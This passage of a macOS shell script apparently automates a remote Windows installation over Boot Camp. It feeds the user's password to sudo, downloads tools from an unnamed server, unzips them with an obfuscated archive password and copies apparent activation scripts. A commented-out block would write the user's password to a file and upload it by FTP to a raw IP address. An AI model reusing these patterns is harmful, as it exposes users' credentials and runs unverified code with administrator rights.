echo "$pass" | sudo -S sudo diskutil unmount disk0s1
fi
if [ "$Winclone7" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -l -p ${restore_device}
fi
fi
if [ "$Winclone6" ]; then
diskutil mount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -l -p ${restore_device}
fi
fi
if [ "$Winclone5" ]; then
if [ -f "/tmp/10boot.zip" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
unzip -o /tmp/10boot.zip -d "${bootcamp_mounted}"
rm -rf /tmp/10boot.zip
fi
diskutil unmount ${restore_device}

if [[ $wzhfxt != "6135" ]]; then
echo "$pass" | sudo -S sudo mkdir /Volumes/EFI
echo "$pass" | sudo -S sudo mount -t msdos /dev/disk0s1 /Volumes/EFI
#if [ $? -ne 0 ] ; then
#echo "$pass" | sudo -S sudo newfs_msdos -v EFI -F 32 /dev/rdisk0s1
#sleep 3
#echo "$pass" | sudo -S sudo mkdir /Volumes/EFI
#echo "$pass" | sudo -S sudo mount -t msdos /dev/disk0s1 /Volumes/EFI
#if [ $? -ne 0 ] ; then
#clear && printf "\e[3J"
#echo
#echo "\033[36mEFI分区存在故障！！！\033[0m"
#echo
#osascript -e 'Tell application "System Events" to display dialog "EFI分区存在故障！请通知技术员！" buttons {"OK"}'
#exit
#fi
#fi
unzip -o /tmp/10efi.zip -d /Volumes/EFI/EFI
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
echo "$pass" | sudo -S sudo diskutil unmount disk0s1
echo "$pass" | sudo -S sudo /tmp/winclone5 -j /tmp -b /tmp/EFIBCD -p ${restore_device} -w -u -x /tmp/genericboot.mbr -f 0
else
echo "$pass" | sudo -S sudo /tmp/winclone5 -x /tmp/genericboot.mbr -j /tmp -p ${restore_device} -f 7
echo "$pass" | sudo -S sudo /tmp/winclone5 -b /tmp/BCD -p ${restore_device} -j /tmp
fi
fi
fi

fi

if [ "$Winclone5" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
bootcamp_mounted="/tmp/666"
fi

if [ "$Winclone6" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
bootcamp_mounted="/tmp/666"
fi

if [ "$Winclone7" ]; then
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone10 -m ${restore_device})
if [ $? -ne 0 ] ; then
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/kms.cmd Users/PC/kms.cmd
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/app.cmd Users/PC/app.cmd
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/soft.exe Users/PC/soft.exe
if [ -f "/tmp/ztgx.reg" ]; then
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/ztgx.reg Users/PC/ztgx.reg
fi
if [ "$lanya" ]; then
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/zdly.exe Users/PC/zdly.exe
fi
if [ "$lanya15" ]; then
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/zdly.exe Users/PC/zdly.exe
fi
if [ "$wf16" ]; then
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/16wifi.exe 16wifi.exe
fi
if [ "$sxt11new" ]; then
#echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/DrvCeo.exe DrvCeo.exe
echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/DrvCeo.exe Users/PC/DrvCeo.exe
fi
#if [ "$sdqh" ]; then
#echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/ydxf.exe Users/PC/ydxf.exe
#echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} /tmp/ydxfgj.exe Users/PC/ydxfgj.exe
#fi
diskutil mount ${restore_device}
fi
fi

if [ -f "/tmp/kms.cmd" ]; then
cp /tmp/kms.cmd "${bootcamp_mounted}/Users/PC"
fi
if [ -f "/tmp/ztgx.reg" ]; then
cp /tmp/ztgx.reg "${bootcamp_mounted}/Users/PC"
fi
if [ "$lanya" ]; then
cp /tmp/zdly.exe "${bootcamp_mounted}/Users/PC"
fi
if [ "$lanya15" ]; then
cp /tmp/zdly.exe "${bootcamp_mounted}/Users/PC"
fi
if [ "$wf16" ]; then
cp /tmp/16wifi.exe "${bootcamp_mounted}"
fi
if [ "$nkqd" ]; then
cp /tmp/nkqd.exe "${bootcamp_mounted}/Users/PC"
fi
if [ "$sxt11new" ]; then
#cp /tmp/DrvCeo.exe "${bootcamp_mounted}"	
cp /tmp/DrvCeo.exe "${bootcamp_mounted}/Users/PC"
fi
#if [ "$sdqh" ]; then
#cp /tmp/ydxf.exe "${bootcamp_mounted}/Users/PC"
#cp /tmp/ydxfgj.exe "${bootcamp_mounted}/Users/PC"
#fi
cp /tmp/app.cmd "${bootcamp_mounted}/Users/PC"
cp /tmp/soft.exe "${bootcamp_mounted}/Users/PC"

if [ "$wzhfxt77" ]; then
cp /tmp/rootsupd.exe "${bootcamp_mounted}/Users/PC"
cp /tmp/ie.reg "${bootcamp_mounted}/Users/PC"
cp /tmp/HFS.reg "${bootcamp_mounted}/Users/PC"
fi

if [ -f "/tmp/10boot.zip" ]; then
unzip -o /tmp/10boot.zip -d "${bootcamp_mounted}"
fi

diskutil unmount ${restore_device}
diskutil mount ${restore_device}





if [ "$pcissd" ]; then
clear && printf "\e[3J"	
echo
echo
echo
echo "\033[36m此机型需默认苹果系统，请手动切换系统！！！\033[0m"
echo
echo
osascript -e 'Tell application "System Events" to display dialog "安装完成，此机型需默认苹果系统, 请拍照并通知技术员！" buttons {"OK"}'
exit 0
fi




if [ -f "/tmp/wl5.zip" ]; then
unzip -o /tmp/wl5.zip -d /tmp
clear && printf "\e[3J"
open /private/tmp/Winclone\ Pro.app 
read -t 5 -p " "
open /private/tmp/555.wcp5license
osascript -e 'Tell application "System Events" to display dialog "请通知技术员，添加系统引导！" buttons {"OK"}'
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "请通知技术员，等待技术员操作！"
fi

if [ "$wzhfxt77" ]; then
if [ "$Winclone7" ]; then
echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot -legacy -file /Volumes/BOOTCAMP/bootmgr
zdcq="1"
fi
fi

if [ ! "$wzhfxt77" ]; then
if [ "$MBR10" ]; then
if [ "$Winclone7" ]; then
echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot -legacy -file /Volumes/BOOTCAMP/bootmgr
zdcq="1"
fi
if [ "$Winclone5" ]; then
#if [[ $modelxh = "10.9"* ]]; then	
#if [ "$wzhfxt" != "6135" ]; then
#echo "$pass" | sudo -S sudo mkdir /Volumes/EFI
#echo "$pass" | sudo -S sudo mount -t msdos /dev/disk0s1 /Volumes/EFI	
#echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
#fi
#fi
if [[ $modelxh = "10.7"* ]]; then	
echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot -legacy -file /Volumes/BOOTCAMP/bootmgr
fi
if [[ $modelxh = "10.8"* ]]; then	
echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot -legacy -file /Volumes/BOOTCAMP/bootmgr
fi
zdcq="1"
fi
fi
fi

if [ ! "$sip" ]; then
if [ ! "$wzhfxt77" ]; then
if [ ! "$MBR10" ]; then
if [ ! "$sdqh" ]; then
if [ "$Winclone7" ]; then
#echo "$pass" | sudo -S sudo /tmp/winclone -b 2 -p ${restore_device}
echo "$pass" | sudo -S sudo diskutil mount disk0s1	
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
zdcq="1"
fi
if [ "$Winclone6" ]; then
#echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot
echo "$pass" | sudo -S sudo diskutil mount disk0s1	
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
zdcq="1"	
fi
if [ "$Winclone5" ]; then
#echo "$pass" | sudo -S sudo bless -mount /Volumes/BOOTCAMP -setBoot
echo "$pass" | sudo -S sudo diskutil mount disk0s1	
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
zdcq="1"	
fi
fi
fi
fi
fi



if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
#osascript -e 'quit app"System Preferences"'
#killall "System Preferences" >/dev/null 2>&1
killall "Safari" >/dev/null 2>&1
killall "Google Chrome" >/dev/null 2>&1
killall "Firefox" >/dev/null 2>&1
killall "WeChat" >/dev/null 2>&1
killall "QQ" >/dev/null 2>&1
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
clear && printf "\e[3J"
echo
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"


if [ ! "$sip" ]; then
if [ "$kzdcq" ]; then
if [ "$zdcq" ]; then
killall "System Preferences" >/dev/null 2>&1	
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
fi

if [ "$sdqh" ]; then
if [ ! "$sip" ]; then
echo "$pass" | sudo -S sudo diskutil mount disk0s1	
echo "$pass" | sudo -S sudo bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi
killall "System Preferences" >/dev/null 2>&1	
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do	
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
fi	
fi
fi
fi

if [ ! "$sdqh" ]; then

if [ "$zdzdcq" ]; then
	

if [ "$zdcq13" ]; then

open /System/Library/PreferencePanes/StartupDisk.prefPane
sleep 3
open /System/Library/PreferencePanes/StartupDisk.prefPane
sleep 3

osascript <<EOD
tell application "System Settings"
activate
end tell
tell application "System Events" to tell process "System Settings"
repeat until exists window "启动磁盘"
delay 0.1
end repeat
tell window "启动磁盘"
delay 0.2
tell splitter group 1
tell group 1
tell scroll area 1
tell radio group 1
click radio button 2
end tell
end tell
end tell
end tell
end tell
end tell
EOD
else
osascript <<EOD
set theBundle to ((path to library folder from system domain as string) & "PreferencePanes:StartupDisk.prefPane:") as «class furl»
set thePane to localized string "CFBundleName" from table "InfoPlist" in bundle theBundle
tell application "System Preferences"
reveal anchor "StartupSearchGroup" of pane id "com.apple.preference.startupdisk"
activate
end tell
tell application "System Events" to tell process "System Preferences"
repeat until exists window thePane
delay 0.1
end repeat
tell window thePane
delay 0.2
tell splitter group 1
tell group 1
tell scroll area 1
tell radio group 1
click radio button 2
end tell
end tell
end tell
end tell
end tell
end tell
EOD
fi

if [ $? -eq 1 ] ; then
clear && printf "\e[3J"
echo
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
if [ ! "$sdqh" ]; then
open /System/Library/PreferencePanes/StartupDisk.prefPane
fi
exit
fi

osascript -e 'quit app"System Settings"'
osascript -e 'quit app"System Preferences"'

sleep 2

pdwinqd="$(echo "$pass" | sudo -S sudo systemsetup -getstartupdisk)"

pdwinqdd="$(echo $pdwinqd | grep WINNT)"

if [ ! "$pdwinqdd" ]; then

if [ "$zdcq13" ]; then

open /System/Library/PreferencePanes/StartupDisk.prefPane
sleep 3
open /System/Library/PreferencePanes/StartupDisk.prefPane
sleep 3

osascript <<EOD
tell application "System Settings"
activate
end tell
tell application "System Events" to tell process "System Settings"
repeat until exists window "启动磁盘"
delay 0.1
end repeat
tell window "启动磁盘"
delay 0.2
tell splitter group 1
tell group 1
tell scroll area 1
tell radio group 1
click radio button 1
end tell
end tell
end tell
end tell
end tell
end tell
EOD
else
osascript <<EOD
set theBundle to ((path to library folder from system domain as string) & "PreferencePanes:StartupDisk.prefPane:") as «class furl»
set thePane to localized string "CFBundleName" from table "InfoPlist" in bundle theBundle
tell application "System Preferences"
reveal anchor "StartupSearchGroup" of pane id "com.apple.preference.startupdisk"
activate
end tell
tell application "System Events" to tell process "System Preferences"
repeat until exists window thePane
delay 0.1
end repeat
tell window thePane
delay 0.2
tell splitter group 1
tell group 1
tell scroll area 1
tell radio group 1
click radio button 1
end tell
end tell
end tell
end tell
end tell
end tell
EOD
fi


osascript -e 'quit app"System Settings"'
osascript -e 'quit app"System Preferences"'

sleep 2

pdwinqd="$(echo "$pass" | sudo -S sudo systemsetup -getstartupdisk)"

pdwinqdd="$(echo $pdwinqd | grep WINNT)"

if [ ! "$pdwinqdd" ]; then
clear && printf "\e[3J"
echo
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
if [ ! "$sdqh" ]; then
open /System/Library/PreferencePanes/StartupDisk.prefPane
fi
exit
fi

fi




clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时20秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=20
while test $t -gt 0
do	
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done


osascript -e 'quit app"System Preferences"'
sleep 3
echo "$pass" | sudo -S sudo shutdown -r now
exit

fi
	
	
open /System/Library/PreferencePanes/StartupDisk.prefPane
else
clear && printf "\e[3J"
echo
echo
echo
echo "\033[36m此机型需默认苹果系统，请手动切换系统！！！\033[0m"
echo
echo
echo
osascript -e 'Tell application "System Events" to display dialog "安装完成，此机型需默认苹果系统, 请拍照并通知技术员！" buttons {"OK"}'
exit 0
fi


#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
if [ ! "$sdqh" ]; then
open /System/Library/PreferencePanes/StartupDisk.prefPane
fi



if [ ! "$zxos" ]; then
osascript <<EOD
tell application "System Events"
activate application "System Preferences"
set visible of processes where name is not "System Preferences" to false
end tell
EOD
sleep 1
osascript <<EOD
tell application "System Events"
activate application "System Preferences"
set visible of processes where name is not "System Preferences" to false
end tell
EOD
else
osascript <<EOD
tell application "System Events"
activate application "System Settings"
set visible of processes where name is not "System Settings" to false
end tell
EOD
sleep 1
osascript <<EOD
tell application "System Events"
activate application "System Preferences"
set visible of processes where name is not "System Preferences" to false
end tell
EOD
fi


exit 0


fi



if [ "$PEDrv" ]; then

echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR
echo "$pass" | sudo -S sudo rm -rf /tmp/Windows.wim
echo "$pass" | sudo -S sudo mkdir -p /tmp/ISODIR

if [[ $modelxh = "10.6"* ]]; then
ISODIR="1"
MBR10="1"
ntfs10="1"
zip7="1"
winclone5="1"
fi
if [[ $modelxh = "10.7"* ]]; then
ISODIR="1"
MBR10="1"
ntfs10="1"
zip7="1"
winclone5="1"
fi
if [[ $modelxh = "10.8"* ]]; then
ISODIR="1"
MBR10="1"
ntfs10="1"
zip7="1"
winclone5="1"
fi
if [[ $modelxh = "10.9"* ]]; then
ISODIR="1"
MBR10="1"
ntfs10="1"
zip7="1"
winclone5="1"
fi
if [[ $modelxh = "10.10"* ]]; then
ISODIR="1"
MBR10="1"
ntfs10="1"
zip7="1"
winclone5="1"
fi
if [[ $modelxh = "10.11"* ]]; then
ISODIR="1"
MBR10="1"
winclone6="1"
fi
if [[ $modelxh = "10.12"* ]]; then
winclone7="1"
ISODIR="1"
fi
if [[ $modelxh = "10.13"* ]]; then
winclone7="1"
fi
if [[ $modelxh = "10.14"* ]]; then
winclone7="1"
fi
if [[ $modelxh = "10.15"* ]]; then
winclone7="1"
fi
if [[ $modelxh = "11."* ]]; then
winclone7="1"
fi
if [[ $modelxh = "12."* ]]; then
winclone7="1"
fi
if [ "$zxos" ]; then
winclone7="1"
fi
if [ "$NoWin7" ]; then
if [[ $modelxh = "10.10"* ]]; then
MBR10=""
ISODIR=""
ntfs10=""
PACMD="1"
old10="1"
fi
if [[ $modelxh = "10.11"* ]]; then
MBR10=""
PACMD="1"
old10="1"
fi
fi

if [ ! "$re700" ]; then
if [ "$sip" ]; then
if [[ $modelxh = "10.11"* ]]; then
MBR10=""
PACMD="1"
old10="1"
fi
fi
fi

if [ "$MBR10" ]; then
ISODIR="1"
if [[ $modelxh = "10.12"* ]]; then
mbrw="-l"
fi
if [[ $modelxh = "10.13"* ]]; then
mbrw="-l"
fi
if [[ $modelxh = "10.14"* ]]; then
mbrw="-l"
fi
if [[ $modelxh = "10.15"* ]]; then
mbrw="-l"
fi
fi




if [ "$repe" ]; then

if [ ! -f ~/Downloads/JG_Download/BootCamp.zip ]; then
if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
read -s -n1 -p "检测不到驱动文件，重新下载"
Customize
fi
fi

if [ "$re700" ]; then
redrv="700"
if [ "$asip" ]; then
redrv="d10"
fi
ISODIR="1"
fi
if [ "$re800" ]; then
redrv="800"
ISODIR="1"
fi
if [ "$reltsc" ]; then
ISODIR="1"
fi
if [ "$re1909" ]; then
redrv="1909"
ISODIR="1"
fi
/tmp/aria2c -c -o boot.zip $ip5/pewincloneee.zip -d /tmp
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/winclone" ]; then
echo
read -t 10 -p "安装工具无法下载，10秒后自动重试..."
Winxt
fi

/tmp/aria2c -c -o repe.zip $ip5/repe"$redrv".zip -d /tmp
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/repe.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/IQI.exe" ]; then
read -t 10 -p "安装工具REPE无法下载，10秒后自动重试..."
Winxt
fi

if [ "$re700" ]; then
if [ "$yyw7" ]; then
/tmp/aria2c -c -o Drv.7z $ip5/Drvy7.7z -d /tmp/RE/Windows/System32
else
/tmp/aria2c -c -o Drv.7z $ip5/Drv7.7z -d /tmp/RE/Windows/System32
fi
fi

if [ "$re800" ]; then
/tmp/aria2c -c -o Drv.7z $ip5/Drv8.7z -d /tmp/RE/Windows/System32
fi


if [ "$re1909" ]; then
/tmp/aria2c -c -o Drv.7z $ip5/Drv1909.7z -d /tmp/RE/Windows/System32
fi

if [ ! "$re700" ]; then
if [ ! "$re800" ]; then
if [ ! "$re1909" ]; then
/tmp/aria2c -c -o Drv.7z $ip5/Drv.7z -d /tmp/RE/Windows/System32
fi
fi
fi

clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/Drv.7z" ]; then
read -t 10 -p "安装工具Drv无法下载，10秒后自动重试..."
Winxt
fi

if [ "$PACMD" ]; then
/tmp/aria2c -c -o PACMD.7z $ip5/PACMD.7z -d /tmp/RE/Windows/System32
clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/PACMD.7z" ]; then
read -t 10 -p "安装工具PACMD无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$pnputil" ]; then
/tmp/aria2c -c -o pnputil.exe $ip5/$pnputil -d /tmp/RE/Windows/System32
clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/pnputil.exe" ]; then
read -t 10 -p "安装工具pnputil无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$reg" ]; then
/tmp/aria2c -c -o ie.reg $ip5/"$reg".reg -d /tmp/RE/Windows/System32
clear && printf "\e[3J"
if [ ! -f "/tmp/RE/Windows/System32/ie.reg" ]; then
read -t 10 -p "安装工具$reg无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$lanya" ]; then
/tmp/aria2c -c -o BroadcomBluetooth64.exe $ip5/BroadcomBluetooth64.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f "/tmp/BroadcomBluetooth64.exe" ]; then
read -t 10 -p "安装工具Lanya无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$wf16" ]; then
/tmp/aria2c -c -o 16wifi.exe https://swdist.apple.com/content/downloads/12/61/041-85004/kgbnv2yk0dzllo3gz0edz19z3kwddo5hma/AppleBcUpdate.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f "/tmp/16wifi.exe" ]; then
read -t 10 -p "安装工具wifi无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$zdbt" ]; then
/tmp/aria2c -c -o bt.exe $ip5/"$zdbt".exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/bt.exe ]; then
read -t 10 -p "安装工具bt无法下载，10秒后自动重试..."
Winxt
fi
fi


if [ "$re700" ]; then

echo "$pass" | sudo -S sudo diskutil mount disk0s1
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Boot
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Microsoft
echo "$pass" | sudo -S sudo diskutil unmount disk0s1


if [ "$Win786" ] ; then
if [ -f ~/Downloads/JG_Download/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso ]; then
w7drv="32"
fi
fi

#/tmp/aria2c -c -o azbc.exe $ip5/azbcw7"$w7drv".exe -d /tmp
#clear && printf "\e[3J"
#if [ ! -f /tmp/azbc.exe ]; then
#read -t 10 -p "安装工具azbc无法下载，10秒后自动重试..."
#Winxt
#fi

if [ "$OsWin764" ]; then
/tmp/aria2c -c -o bcsz.exe $ip5/bcszw7"$w7drv".exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/bcsz.exe ]; then
read -t 10 -p "安装工具bcsz无法下载，10秒后自动重试..."
Winxt
fi


/tmp/aria2c -c -o qdgx.exe $ip5/qdgx.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/qdgx.exe ]; then
read -t 10 -p "安装工具qdgx无法下载，10秒后自动重试..."
Winxt
fi

#/tmp/aria2c -c -o AppleBluetoothBroadcomInstaller64.exe $ip5/AppleBluetoothBroadcomInstaller64.exe -d /tmp
#clear && printf "\e[3J"
#if [ ! -f /tmp/AppleBluetoothBroadcomInstaller64.exe ]; then
#read -t 10 -p "安装工具AppleBluetoothBroadcomInstaller64无法下载，10秒后自动重试..."
#Winxt
#fi


fi

fi

if [ "$re800" ]; then

/tmp/aria2c -c -o azbc.exe $ip5/azbc.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/azbc.exe ]; then
read -t 10 -p "安装工具azbct2无法下载，10秒后自动重试..."
Winxt
fi

/tmp/aria2c -c -o bcsz.exe $ip5/bcsz.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/bcsz.exe ]; then
read -t 10 -p "安装工具bcsz无法下载，10秒后自动重试..."
Winxt
fi

/tmp/aria2c -c -o qdgx.exe $ip5/qdgx.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/qdgx.exe ]; then
read -t 10 -p "安装工具qdgx无法下载，10秒后自动重试..."
Winxt
fi

fi

if [ ! "$re1909" ]; then
if [ ! "$re700" ]; then
if [ ! "$re800" ]; then
if [ "$T2XP" ]; then
/tmp/aria2c -c -o azbc.exe $ip5/azbc.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/azbc.exe ]; then
read -t 10 -p "安装工具azbct2无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$T2XP" ]; then
/tmp/aria2c -c -o bcsz.exe $ip5/bcszt2.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/bcsz.exe ]; then
read -t 10 -p "安装工具azbct2无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ ! "$T2XP" ]; then
/tmp/aria2c -c -o azbc.exe $ip5/azbc.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/azbc.exe ]; then
read -t 10 -p "安装工具azbc无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ ! "$oldsz" ]; then

/tmp/aria2c -c -o qdzh.exe $ip5/qdzh.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/qdzh.exe ]; then
read -t 10 -p "安装工具qdzh无法下载，10秒后自动重试..."
Winxt
fi
fi


if [ "$oldsz" ]; then
/tmp/aria2c -c -o qdzh.exe $ip5/oldqdzh.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/qdzh.exe ]; then
read -t 10 -p "安装工具qdzh无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$Win11" ]; then
/tmp/aria2c -c -o Win11.exe $ip5/Win11.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/Win11.exe ]; then
read -t 10 -p "安装工具Win11无法下载，10秒后自动重试..."
Winxt
fi
fi

/tmp/aria2c -c -o azbcgx.exe $ip5/azbcgx.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/azbcgx.exe ]; then
read -t 10 -p "安装工具azbcgx无法下载，10秒后自动重试..."
Winxt
fi


if [ ! "$T2XP" ]; then
/tmp/aria2c -c -o bcsz.exe $ip5/bcsz.exe -d /tmp
clear && printf "\e[3J"
if [ ! -f /tmp/bcsz.exe ]; then
read -t 10 -p "安装工具bcsz无法下载，10秒后自动重试..."
Winxt
fi
fi

fi
fi
fi

if [ "$xtyh" ]; then
/tmp/aria2c -c -o yxk.exe $ip5/yxk.exe -d /tmp
if [ ! -f /tmp/yxk.exe ]; then
read -t 10 -p "安装工具yxk无法下载，10秒后自动重试..."
Winxt
fi
/tmp/aria2c -c -o act.exe $ip5/act.exe -d /tmp
if [ ! -f /tmp/act.exe ]; then
read -t 10 -p "安装工具act无法下载，10秒后自动重试..."
Winxt
fi
fi


if [ "$ISODIR" ]; then
if [ "$re1909" ]; then
#/tmp/aria2c -c -o ISODIR.zip $ip5/1909ISODIR.zip -d /tmp	
/tmp/aria2c -c -o ISODIR.zip $osip/1909ISODIR.zip -d /tmp
else
/tmp/aria2c -c -o ISODIR.zip $ip5/ISODIR.zip -d /tmp
fi
echo "$pass" | sudo -S sudo unzip -o "/tmp/ISODIR.zip" -d "/tmp" >/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/ISODIR/bootmgr.efi" ]; then
echo	
read -t 10 -p "安装工具ISODIR无法下载，10秒后自动重试..."
Winxt
fi
fi

if [ "$old10" ]; then
if [[ $modelxh = "10.10"* ]]; then
/tmp/aria2c -c -o ISODIR.zip $ip5/ISODIR.zip -d /tmp
echo "$pass" | sudo -S sudo unzip -o "/tmp/ISODIR.zip" -d "/tmp" >/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/ISODIR/bootmgr.efi" ]; then
echo
echo	
read -t 10 -p "安装工具ISODIR无法下载，10秒后自动重试..."
Winxt
fi
else
/tmp/aria2c -c -o WPE.zip $ip5/WPE.zip -d /tmp
unzip -o "/tmp/WPE.zip" -d "/tmp">/dev/null 2>&1
if [ ! -f "/tmp/WPE/WEPE/WEPE.SDI" ]; then
read -t 10 -p "安装工具WPE无法下载，10秒后自动重试..."
Winxt
fi
fi
rm -rf /tmp/RE/Windows/System32/Sys.cmd
/tmp/aria2c -c -o pesys.zip $ip5/pesys.zip -d /tmp
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/pesys.zip" -d "/tmp/RE/Windows/System32">/dev/null 2>&1
clear && printf "\e[3J"
